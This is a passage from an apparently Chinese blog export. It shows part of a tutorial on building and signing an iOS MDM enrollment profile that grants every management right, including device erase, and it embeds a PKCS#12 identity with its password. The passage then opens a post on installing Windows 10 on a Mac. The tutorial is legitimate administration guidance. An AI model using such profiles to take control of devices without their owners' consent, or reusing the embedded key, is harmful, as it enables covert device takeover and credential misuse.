&lt;key&gt;PayloadCertificateFileName&lt;/key&gt; &lt;string&gt;DevAuthCA.cer.der&lt;/string&gt; &lt;key&gt;PayloadContent&lt;/key&gt; &lt;data&gt; MIIEFzCCAv+gAwIBAgIIZylBveTSpRowDQYJKoZIhvcNAQELBQAw YjELMAkGA1UEBhMCVVMxEzARBgNVBAoTCkFwcGxlIEluYy4xJjAk BgNVBAsTHUFwcGxlIENlcnRpZmljYXRpb24gQXV0aG9yaXR5MRYw FAYDVQQDEw1BcHBsZSBSb290IENBMB4XDTEzMDQyOTE4NDA1NFoX DTI4MDQyOTE4NDA1NFowgYsxOTA3BgNVBAMMMERldmVsb3BlciBB dXRoZW50aWNhdGlvbiBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eTEs MCoGA1UECwwjQXBwbGUgV29ybGR3aWRlIERldmVsb3BlciBSZWxh dGlvbnMxEzARBgNVBAoMCkFwcGxlIEluYy4xCzAJBgNVBAYTAlVT MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6rDzm76u 93aLqrS9hopNDa9oIjbzlWn62CLEsB4+GmzBJR6qK+ITfjbh6G0a /etrPsB/LYqUU4WAJiiZZqMWCLTkvD061OoGQFlZEt7fJu0plH49 08rzTUA4nd81towql+yjYJH9wSGgvDfg2QpsvXd5c2ITTjgSUfZR wSFHTYHA3Eoj/rpDuuar1RHxZsswxrdB8o8lHJuaShGHWFbsYfNC FUmFMAxZbA3ppTYwcaAD8/KjUM3AeJbVqToz81QhEYmfMYFpsb8x I5ae3MNmOlBaL169c+hUHFTtoUmzbRI1gnrXVKhLMsIpCngAvNEp X85mEOCnN2NCJQrk3Ig5cQIDAQABo4GmMIGjMB0GA1UdDgQWBBRJ 9jYJuBsj+gNbtuqCoNldEBhnBjAPBgNVHRMBAf8EBTADAQH/MB8G A1UdIwQYMBaAFCvQaUeUdgn+9GuNLkCm90dNfwheMC4GA1UdHwQn MCUwI6AhoB+GHWh0dHA6Ly9jcmwuYXBwbGUuY29tL3Jvb3QuY3Js MA4GA1UdDwEB/wQEAwIBBjAQBgoqhkiG92NkBgILBAIFADANBgkq hkiG9w0BAQsFAAOCAQEA1fKJRhfZZspW9+GqK8+E6ciXbsABciYm IvGy0snmeRN+e1KuFsoQmOXmdNY7SFvdb+2ZN/doOd5Es8hAih+3 VwHbac8YiFDXphpQshJJrtiOSBSsXBDgz0b4LjRqhtXdU9BB67nD Q2/zZSNKxvIqXqqsPQiKv/tctQH7kr3ogmZ4GkqjGgHWEocbTfOF pioDQ1xXP0eF/jn02cp9vnyAuyqpkybJYkaIAVUq2bRWV+9D6WLo 6/3X8AWOCj65GPgx+DLIDAD2yHJu1D9JuSqD5cD1AChpPUregUvi Uszq4TyJ7LjHi4/w1jbWrlbeObEp2lNcKFTKIkeSZ88IE2b25g== &lt;/data&gt; &lt;key&gt;PayloadDescription&lt;/key&gt; &lt;string&gt;添加 PKCS#1 格式的证书&lt;/string&gt; &lt;key&gt;PayloadDisplayName&lt;/key&gt; &lt;string&gt;Developer Authentication Certification Authority&lt;/string&gt; &lt;key&gt;PayloadIdentifier&lt;/key&gt; &lt;string&gt;com.apple.security.pkcs1.A742C668-A859-4DB9-B7AD-5913CDACD1C9&lt;/string&gt; &lt;key&gt;PayloadType&lt;/key&gt; &lt;string&gt;com.apple.security.pkcs1&lt;/string&gt; &lt;key&gt;PayloadUUID&lt;/key&gt; &lt;string&gt;A742C668-A859-4DB9-B7AD-5913CDACD1C9&lt;/string&gt; &lt;key&gt;PayloadVersion&lt;/key&gt; &lt;integer&gt;1&lt;/integer&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;PayloadCertificateFileName&lt;/key&gt; &lt;string&gt;AppleWWDRCAG2.cer&lt;/string&gt; &lt;key&gt;PayloadContent&lt;/key&gt; &lt;data&gt; MIIC9zCCAnygAwIBAgIIb+/Y9emjp+4wCgYIKoZIzj0EAwIwZzEb MBkGA1UEAwwSQXBwbGUgUm9vdCBDQSAtIEczMSYwJAYDVQQLDB1B cHBsZSBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eTETMBEGA1UECgwK QXBwbGUgSW5jLjELMAkGA1UEBhMCVVMwHhcNMTQwNTA2MjM0MzI0 WhcNMjkwNTA2MjM0MzI0WjCBgDE0MDIGA1UEAwwrQXBwbGUgV29y bGR3aWRlIERldmVsb3BlciBSZWxhdGlvbnMgQ0EgLSBHMjEmMCQG A1UECwwdQXBwbGUgQ2VydGlmaWNhdGlvbiBBdXRob3JpdHkxEzAR BgNVBAoMCkFwcGxlIEluYy4xCzAJBgNVBAYTAlVTMFkwEwYHKoZI zj0CAQYIKoZIzj0DAQcDQgAE3fC3BkvP3XMEE8RDiQOTgPte9nSt QmFSWAImUxnIYyIHCVJhysTZV+9tJmiLdJGMxPmAaCj8CWjwENrp 0C7JGqOB9zCB9DBGBggrBgEFBQcBAQQ6MDgwNgYIKwYBBQUHMAGG Kmh0dHA6Ly9vY3NwLmFwcGxlLmNvbS9vY3NwMDQtYXBwbGVyb290 Y2FnMzAdBgNVHQ4EFgQUhLaEzDqGYnIWWZToGqO9SN863wswDwYD VR0TAQH/BAUwAwEB/zAfBgNVHSMEGDAWgBS7sN6hWDOImqSKmd6+ veuv2sskqzA3BgNVHR8EMDAuMCygKqAohiZodHRwOi8vY3JsLmFw cGxlLmNvbS9hcHBsZXJvb3RjYWczLmNybDAOBgNVHQ8BAf8EBAMC AQYwEAYKKoZIhvdjZAYCDwQCBQAwCgYIKoZIzj0EAwIDaQAwZgIx ANmxxzHGI/ZPTdDZR8V9GGkRh3En02it4Jtlmr5s3z9GppAJvm6h OyywUYlBPIfSvwIxAPxkUolLPF2/axzCiZgvcq61m6oaCyNUd1To FUOixRLal1BzfF7QbrJcYlDXUfE6Wg== &lt;/data&gt; &lt;key&gt;PayloadDescription&lt;/key&gt; &lt;string&gt;添加 PKCS#1 格式的证书&lt;/string&gt; &lt;key&gt;PayloadDisplayName&lt;/key&gt; &lt;string&gt;Apple Worldwide Developer Relations CA - G2&lt;/string&gt; &lt;key&gt;PayloadIdentifier&lt;/key&gt; &lt;string&gt;com.apple.security.pkcs1.32A40F6B-24FA-4026-9BF6-66AED47CEC40&lt;/string&gt; &lt;key&gt;PayloadType&lt;/key&gt; &lt;string&gt;com.apple.security.pkcs1&lt;/string&gt; &lt;key&gt;PayloadUUID&lt;/key&gt; &lt;string&gt;32A40F6B-24FA-4026-9BF6-66AED47CEC40&lt;/string&gt; &lt;key&gt;PayloadVersion&lt;/key&gt; &lt;integer&gt;1&lt;/integer&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;PayloadCertificateFileName&lt;/key&gt; &lt;string&gt;AppleRootCA-G2.cer&lt;/string&gt; &lt;key&gt;PayloadContent&lt;/key&gt; &lt;data&gt; MIIFkjCCA3qgAwIBAgIIAeDltYNno+AwDQYJKoZIhvcNAQEMBQAw ZzEbMBkGA1UEAwwSQXBwbGUgUm9vdCBDQSAtIEcyMSYwJAYDVQQL DB1BcHBsZSBDZXJ0aWZpY2F0aW9uIEF1dGhvcml0eTETMBEGA1UE CgwKQXBwbGUgSW5jLjELMAkGA1UEBhMCVVMwHhcNMTQwNDMwMTgx MDA5WhcNMzkwNDMwMTgxMDA5WjBnMRswGQYDVQQDDBJBcHBsZSBS b290IENBIC0gRzIxJjAkBgNVBAsMHUFwcGxlIENlcnRpZmljYXRp b24gQXV0aG9yaXR5MRMwEQYDVQQKDApBcHBsZSBJbmMuMQswCQYD VQQGEwJVUzCCAiIwDQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIB ANgREkhI2imKScUcx+xuM23+TfvgHN6sXuI2pyT5f1BrTM65MFQn 5bPW7SXmMLYFN14UIhHF6Kob0vuy0gmVOKTvKkmMXT5xZgM4+xb1 hYjkWpIMBDLyyED7Ul+f9sDx47pFoFDVEovy3d6RhiPw9bZyLgHa C/YuOQhfGaFjQQscp5TBhsRTL3b2CtcM0YM/GlMZ81fVJ3/8E7j4 ko380yhDPLVoACVdJ2LT3VXdRCCQgzWTxb+4Gftr49wIQuavbfqe QMpOhYV4SbHXw8EwOTKrfl+q04tvny0aIWhwZ7Oj8ZhBbZF8+Nfb qOdfIRqMM78xdLe40fTgIvS/cjTf94FNcX1RoeKz8NMoFnNvzcyt N31O661A4T+B/fc9Cj6i8b0xlilZ3MIZgIxbdMYs0xBTJh0UT8TU gWY8h2czJxQI6bR3hDRSj4n4aJgXv8O7qhOTH11UL6jHfPsNFL4V PSQ08prcdUFmIrQB1guvkJ4M6mL4m1k8COKWNORj3rw31OsMiAND C1CvoDTdUE0V+1ok2Az6DGOeHwOx4e7hqkP0ZmUoNwIx7wHHHtHM n23KVDpA287PT0aLSmWaasZobNfMmRtHsHLDd4/E92GcdB/O/Wuh wpyUgquUoue9G7q5cDmVF8Up8zlYNPXEpMZ7YLlmQ1A/bmH8DvmG qmAMQ0uVAgMBAAGjQjBAMB0GA1UdDgQWBBTEmRNsGAPCe8CjoA1/ coB6HHcmjTAPBgNVHRMBAf8EBTADAQH/MA4GA1UdDwEB/wQEAwIB BjANBgkqhkiG9w0BAQwFAAOCAgEAUabz4vS4PZO/Lc4Pu1vhVRRO TtHlznldgX/+tvCHM/jvlOV+3Gp5pxy+8JS3ptEwnMgNCnWefZKV fhidfsJxaXwU6s+DDuQUQp50DhDNqxq6EWGBeNjxtUVAeKuowM77 fWM3aPbn+6/Gw0vsHzYmE1SGlHKy6gLti23kDKaQwFd1z4xCfVzm MX3zybKSaUYOiPjjLUKyOKimGY3xn83uamW8GrAlvacp/fQ+onVJ v57byfenHmOZ4VxG/5IFjPoeIPmGlFYl5bRXOJ3riGQUIUkhOb9i ZqmxospvPyFgxYnURTbImHy99v6ZSYA7LNKmp4gDBDEZt7Y6YUX6 yfIjyGNzv1aJMbDZfGKnexWoiIqrOEDCzBL/FePwN983csvMmOa/ orz6JopxVtfnJBtIRD6e/J/JzBrsQzwBvDR4yGn1xuZW7AYJNpDr FEobXsmII9oDMJELuDY++ee1KG++P+w8j2Ud5cAeh6Squpj9kuNs JnfdBrRkBof0Tta6SqoWqPQFZ2aWuuJVecMsXUmPgEkrihLHdoBR 37q9ZV0+N0djMenl9MU/S60EinpxLK8JQzcPqOMyT/RFtm2XNuyE 9QoB6he7hY1Ck3DDUOUUi78/w0EP3SIEIwiKum1xRKtzCTrJ+VKA Cd+66eYWyi4uTLLT3OUEVLLUNIAytbwPF+E= &lt;/data&gt; &lt;key&gt;PayloadDescription&lt;/key&gt; &lt;string&gt;添加 CA 根证书&lt;/string&gt; &lt;key&gt;PayloadDisplayName&lt;/key&gt; &lt;string&gt;Apple Root CA - G2&lt;/string&gt; &lt;key&gt;PayloadIdentifier&lt;/key&gt; &lt;string&gt;com.apple.security.root.A0BB6B15-2A9E-47B8-9EC2-871F1C04DE8E&lt;/string&gt; &lt;key&gt;PayloadType&lt;/key&gt; &lt;string&gt;com.apple.security.root&lt;/string&gt; &lt;key&gt;PayloadUUID&lt;/key&gt; &lt;string&gt;A0BB6B15-2A9E-47B8-9EC2-871F1C04DE8E&lt;/string&gt; &lt;key&gt;PayloadVersion&lt;/key&gt; &lt;integer&gt;1&lt;/integer&gt; &lt;/dict&gt; &lt;dict&gt; &lt;key&gt;Password&lt;/key&gt; &lt;string&gt;yourPWD&lt;/string&gt; &lt;key&gt;PayloadCertificateFileName&lt;/key&gt; &lt;string&gt;Identity.p12&lt;/string&gt; &lt;key&gt;PayloadContent&lt;/key&gt; &lt;data&gt; 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 e96ah6AF/AQIVFgg47LiiYwCAggA &lt;/data&gt; &lt;key&gt;PayloadDescription&lt;/key&gt; &lt;string&gt;添加 PKCS#12 格式的证书&lt;/string&gt; &lt;key&gt;PayloadDisplayName&lt;/key&gt; &lt;string&gt;Identity.p12&lt;/string&gt; &lt;key&gt;PayloadIdentifier&lt;/key&gt; &lt;string&gt;com.apple.security.pkcs12.E61D7ED5-850A-4F2E-B191-F99E40846FF6&lt;/string&gt; &lt;key&gt;PayloadType&lt;/key&gt; &lt;string&gt;com.apple.security.pkcs12&lt;/string&gt; &lt;key&gt;PayloadUUID&lt;/key&gt; &lt;string&gt;E61D7ED5-850A-4F2E-B191-F99E40846FF6&lt;/string&gt; &lt;key&gt;PayloadVersion&lt;/key&gt; &lt;integer&gt;1&lt;/integer&gt; &lt;/dict&gt; &lt;/array&gt; &lt;key&gt;PayloadDescription&lt;/key&gt; &lt;string&gt;MDM enbale server manage your device&lt;/string&gt; &lt;key&gt;PayloadDisplayName&lt;/key&gt; &lt;string&gt;XXX MDM&lt;/string&gt; &lt;key&gt;PayloadIdentifier&lt;/key&gt; &lt;string&gt;com.apple.mgmt.External.3a3c70d4-cc4f-4713-xxxx-f38d6fd7xxxx&lt;/string&gt; &lt;key&gt;PayloadOrganization&lt;/key&gt; &lt;string&gt;XXX&lt;/string&gt; &lt;key&gt;PayloadRemovalDisallowed&lt;/key&gt; &lt;false/&gt; &lt;key&gt;PayloadType&lt;/key&gt; &lt;string&gt;Configuration&lt;/string&gt; &lt;key&gt;PayloadUUID&lt;/key&gt; &lt;string&gt;D633CDFE-9806-4224-AD38-7FE0CAB12163&lt;/string&gt; &lt;key&gt;PayloadVersion&lt;/key&gt; &lt;integer&gt;1&lt;/integer&gt; &lt;/dict&gt; &lt;/plist&gt; 上面直接用那个工具填写相关信息并导入相关证书就能生成，但是真正的MDM策略相关需要手动添加一个字典如下： &lt;dict&gt; &lt;key&gt;AccessRights&lt;/key&gt; &lt;integer&gt;8191&lt;/integer&gt; &lt;key&gt;CheckInURL&lt;/key&gt; &lt;string&gt;https://mdmapi.demo.com/checkin&lt;/string&gt; &lt;key&gt;CheckOutWhenRemoved&lt;/key&gt; &lt;true/&gt; &lt;key&gt;IdentityCertificateUUID&lt;/key&gt; &lt;string&gt;E61D7ED5-850A-4F2E-B191-F99E40846FF6&lt;/string&gt; &lt;key&gt;PayloadDescription&lt;/key&gt; &lt;string&gt;Configures MobileDeviceManagement.&lt;/string&gt; &lt;key&gt;PayloadIdentifier&lt;/key&gt; &lt;string&gt;com.apple.mdm.2C62A547-9CA9-4D5A-AF86-0DF2467274EF&lt;/string&gt; &lt;key&gt;PayloadOrganization&lt;/key&gt; &lt;string&gt;Developer Insider&lt;/string&gt; &lt;key&gt;PayloadType&lt;/key&gt; &lt;string&gt;com.apple.mdm&lt;/string&gt; &lt;key&gt;PayloadUUID&lt;/key&gt; &lt;string&gt;E7438708-331E-4E68-99BC-3B9B435DF3DC&lt;/string&gt; &lt;key&gt;PayloadVersion&lt;/key&gt; &lt;integer&gt;1&lt;/integer&gt; &lt;key&gt;ServerURL&lt;/key&gt; &lt;string&gt;https://mdmapi.demo.com/server&lt;/string&gt; &lt;key&gt;SignMessage&lt;/key&gt; &lt;true/&gt; &lt;key&gt;Topic&lt;/key&gt; &lt;string&gt;com.apple.mgmt.External.3a3c70d4-cc4f-4713-xxxx-f38d6fd7xxxx&lt;/string&gt; &lt;key&gt;UseDevelopmentAPNS&lt;/key&gt; &lt;false/&gt; &lt;/dict&gt; 这里简单说几个比较重点的字段 KEY TYPE DESCRIPTION IdentityCertificateUUID String Mandatory. UUID of the certificate payload for the device’s identity. It may also point to a SCEP payload. You need to use the PayloadUUID of the identity.p12 in this field. PayloadUUID String Mandatory. Here you need to generate a UUID. You can use uuidgen to generate an UUID and then copy paste that UUID in this field. UUID looks like this 34995C2E-XXXX-XXXX-XXXX-D6DB637A1D6E PayloadIdentifier String Here you need to append the UUID in after com.apple.mdm. which we generated in last step. Your payload identifier looks like this com.apple.mdm.34995C2E-XXXX-XXXX-XXXX-D6DB637A1D6E Topic String Mandatory. The topic that MDM listens to for push notifications. The certificate that the server uses to send push notifications must have the same topic in its subject. The topic must begin with the com.apple.mgmt.External.hexstuffhere... prefix. ServerURL String Mandatory. The URL that the device contacts to retrieve device management instructions. Must begin with the https:// URL scheme, and may contain a port number (https://YOUR_HOSTNAME_OR_IP:PORT/server, for example). CheckInURL String Optional. The URL that the device should use to check in during installation. Must begin with the https:// URL scheme and may contain a port number (https://YOUR_HOSTNAME_OR_IP:8080/checkin, for example). If this URL is not given, the ServerURL is used for both purposes. CheckOutWhenRemoved Boolean Optional. If true, the device attempts to send a CheckOutmessage to the check-in server when the profile is removed. Defaults to false. AccessRights Integer, flags Required. Logical OR of the following bit-flags:1: Allow inspection of installed configuration profiles.2: Allow installation and removal of configuration profiles.4: Allow device lock and passcode removal.8: Allow device erase.16: Allow query of Device Information (device capacity, serial number).32: Allow query of Network Information (phone/SIM numbers, MAC addresses).64: Allow inspection of installed provisioning profiles.128: Allow installation and removal of provisioning profiles.256: Allow inspection of installed applications.512: Allow restriction-related queries.1024: Allow security-related queries.2048: Allow manipulation of settings.4096: Allow app management.May not be zero. If 2 is specified, 1 must also be specified. If 128 is specified, 64 must also be specified. UseDevelopmentAPNS Boolean Optional. If true, the device uses the development APNS servers. Otherwise, the device uses the production servers. Defaults to false. Note that this property must be set to false if your Apple Push Notification Service certificate was issued by the Apple Push Certificate Portal. That portal only issues certificates for the production push environment. IdentityCertificateUUID：这个UUID是identity.p12的PayloadUUID。关于identity.p12这里其实是一个设备标识的证书，这个证书可能不知道怎么制作。其实用自签的签名就行。制作流程如下 生成自签证书（生成2046位的加密私钥） openssl genrsa -out server.key 2048 生成自签证书（生成证书签名请求） openssl req -new -key server.key -out server.csr 生成自签证书（生成类型为X509的自签名证书） openssl x509 -req -days 3650 -in server.csr -signkey server.key -out server.crt 这时候我们有server.key、server.csr、server.crt三个文件 然后将server.crt复制生成两个文件并命名：identity.crt、server.crt 同样将server.key复制生成两个文件并命名：cakey.key、identity.key 最后将server.csr重命名为identity.csr 然后用make_certs.sh生成Identity.p12 AccessRights：这个字段会在安装描述文件的时候提示申请了哪些权限，并且这里是按位与运算 CheckInURL以及ServerURL涉及到后面MDM设备、苹果APNS、服务器三方通信相关 签名描述文件在签名前建议先对未签名的描述文件进行通信测试，保证在未签名之前安装描述文件以后服务端能够正常发送指令通信。 这里的签名仅仅是为了部署描述文件，和MDM本身并不相关，所以事实上可以用任意一个证书进行签名，但为了保证是公司发布的描述文件，建议用公司的iOS开发证书即可。这里提供两个工具 Hancock App ProfileSigner 使用比较简单，这里不再介绍。 MDM通信指令结构及原理分析暂位，后面有时间再补充 企业MDM最佳方案虽然MDM自身提供了很多远程指令相关的移动设备管理功能，但是在实际上企业管理中还远远不够，所以建议配合一个agent之类的app辅助。在我们实现中，采用安装描述文件的时候就推送安装agent，然后用户后续的所有交互都由app负责。app主要作用在于能够获取定位，账号设备绑定，安全准入，扫码登录等等。以及能够提供公司级的VPN等相关公司配置。这里能做的还有很多，可以和企业实际的管理结合。 参考 https://developerinsider.co/how-to-create-a-verified-ios-mobile-device-management-mdm-profile/ https://github.com/vineetchoudhary/Apple-iOS-MDM-Server https://micromdm.io/blog/certificates/ https://osxdominion.wordpress.com/2015/04/21/signing-mobileconfig-profiles-with-keychain-certificates/ https://micromdm.io/blog/certificates/ &gt;!!!&lt; https://github.com/micromdm/micromdm","tags":[{"name":"MDM","slug":"MDM","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/MDM/"},{"name":"wiki","slug":"wiki","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/wiki/"}]},{"title":"Mac安装Win10完整指南","date":"2019-08-21T05:44:54.000Z","path":"2019/08/21/mac-install-windows/mac-install-windows/","text":"Mac安装Win10完整指南 关于win10你想要的安装方式，各种姿势以及各种坑和解决方案都在这里 开始对于某些软件只有win版本或者在win上性能更好，这时候你就会想装win系统了。一般来说有两种选择，一是用虚拟机，二是装双系统。然而虚拟机太慢太卡，而且还和双系统存在同一个问题在于会和mac自身系统占用同一块磁盘，对于256G大小的磁盘空间来说相当限制。如果你现在想装Windows或者正遇到问题，那么这篇笔记应该能解决你的问题。我会尽可能把我在安装过程中遇到的问题以及解决方案都描述清楚。 那么这里还提供一种方案就是将win装在外置磁盘上面，这样上面的问题都得到的解决，因为现在的外置SSD速度已经相当快，完全能满足将一个操作系统放到外置SSD的需求。不仅如此，我还尝试了在外置SSD上面装双系统，这样可以将一块SSD磁盘的利用率最大化。 作为对比，我这里会将所有的安装方式都尝试一遍。将会安装以下顺序介绍mac上面安装win的具体方案。 用虚拟机安装win10 用BootCamp安装win10 用移动SSD安装win10 用移动SSD安装装系统 虚拟机安装win10对于虚拟机安装win10，只需要把镜像文件放到VMWare等虚拟机内一直下一步就能安装，这里就不再介绍这种方式。 BootCamp安装win101 、Bootcamp全自动安装早就听说在最新的macOS系统版本中，用BootCamp能很简单的安装Windows，既然如此决定先用BootCamp试试。这里你首先需要下载一个Windows的iso镜像文件，我这里提供几个下载的地址 https://msdn.itellyou.cn/ https://tb.rg-adguard.net/public.php?lang=zh-CN https://www.microsoft.com/zh-cn/software-download/windows10ISO （我是在官网下载的镜像） 